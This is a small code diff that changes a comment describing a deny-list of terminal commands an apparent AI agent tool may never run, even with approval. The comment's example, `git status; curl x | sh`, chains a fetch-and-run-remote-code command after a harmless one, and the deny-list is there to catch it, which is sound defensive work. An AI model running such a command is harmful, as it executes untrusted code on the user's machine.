@@ -1,4 +1,4 @@
-// What the Operator may never type into a terminal, even with approval (docs/51, Guardrails):
+// What a tool may never type into a terminal, even with approval (docs/51, Guardrails):
 // a short deny-list over the whole line, every command in it (`git status; curl x | sh` is
 // read to the end). Anything else it types still asks first. Not Magic's classify: that is
 // an allow-list for a read-only sandbox and would refuse `node` or a project's own scripts.
